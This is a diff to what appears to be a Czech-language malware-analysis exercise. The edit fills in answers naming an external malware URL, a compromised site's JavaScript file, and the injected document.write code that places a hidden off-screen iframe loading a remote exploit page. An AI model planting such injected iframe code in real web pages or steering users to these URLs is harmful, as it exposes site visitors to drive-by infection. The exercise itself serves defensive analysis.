@@ -52,13 +52,15 @@ document.write('<div class="" style="position:absolute; width:383px; height:368p
 ### 3. Samotný malware je uložen na jiné (externí) URL adrese. Jaká je to adresa?
 
 ```
-
+http://p27dokhpz2n7nvgr.1jw2lx.top/EE7E-AD39-7D8C-080C-18BF?iframe&_=1485557725652
 ```
 
 ### 4. Jakým způsobem došlo k přesměrování na externí URL se škodlivým kódem?
 
-```
+`http://retrotip.visionurbana.com.ve/dle_js.js`
 
+```
+document.write('<div class="" style="position:absolute; width:383px; height:368px; left:17px; top:-858px;">  <div  style="" class=""><a>head</a><a class="head-menu-2"> </a><iframe src="http://tyu.benme.com/?q=zn_QMvXcJwDQDofGMvrESLtEMUbQA0KK2OH_76iyEoH9JHT1vrTUSkrttgWC&biw=Amaya.81lp85.406f4y5l9&oq=elTX_fUlL7ABPAuy2EyALQZnlY0IU1IQ8fj630PWwUWZ0pDRqx29UToBvdeW&yus=Amaya.110oz60.406a7e5q8&br_fl=4109&tuif=5364&ct=Amaya" width=290 height=257 ></ifr' +'ame> <a style=""></a></div><a class="" style="">temp</a></div>');
 ```
 
 alebo
